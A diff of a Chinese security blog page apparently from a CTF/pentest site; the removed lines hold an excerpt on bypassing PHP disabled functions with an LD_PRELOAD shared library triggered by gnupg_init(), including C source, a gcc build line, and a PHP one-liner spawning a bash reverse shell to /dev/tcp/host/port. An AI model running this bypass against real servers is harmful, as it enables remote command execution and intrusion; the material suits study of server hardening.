@@ -185,7 +185,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/31/绕过CDN查真实ip/">Apache solr RCE（CVE-2019-xxxx）</a>
+      <a class="article-title" href="/2020/05/31/绕过CDN查真实ip/">绕过CDN查找真实ip</a>
     </h1>
   
 
@@ -353,14 +353,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>命令执行一般都用php自带的函数来进行执行,但是很多时候运维或者搞安全的会禁用这些用不到的函数来加固,包括一些CTF也是禁用一些函数来考察你的绕过能力,这时候就需要你对常见的函数绕过进行一些了解,本文就是总结下php在所有自带命令执行函数被禁后的其他操作.</p>
-<h3 id="常见的自带系统命令执行函数"><a href="#常见的自带系统命令执行函数" class="headerlink" title="常见的自带系统命令执行函数"></a>常见的自带系统命令执行函数</h3><h3 id="使用LD-PRELOAD-绕过"><a href="#使用LD-PRELOAD-绕过" class="headerlink" title="使用LD_PRELOAD 绕过"></a>使用LD_PRELOAD 绕过</h3><h4 id="gnupg扩展"><a href="#gnupg扩展" class="headerlink" title="gnupg扩展"></a>gnupg扩展</h4><p>如果看到phpinfo中有gnupg苦熬站,说明可以使用gpg加密,gnupg拓展下的gnupg_init() 函数 可以进行命令执行 bypass</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">j0k3r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"cmd"</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        system(getenv(<span class="string">"cmd"</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        system(<span class="string">"echo 'no cmd' &gt; /tmp/cmd.output"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>本地把以上代码生成 exp.so， <code>gcc --share -fPIC exp.c -o exp.so</code><br>然后上传文件到 /tmp/exp.so<br>通过php代码进行利用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>putenv(<span class="string">"cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1'"</span>);putenv(<span class="string">"LD_PRELOAD=/tmp/exp.so"</span>);gnupg_init();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这样就可以反弹shell了.</p>
-
+        
+          <a class="article-more-a" href="/2020/02/02/绕过php的disable函数进行命令执行/#more">more >></a>
+        
       
 
       
@@ -1063,11 +1058,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+                <a href="javascript:void(0)" class="js-tag color5">内网安全</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内网安全</a>
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
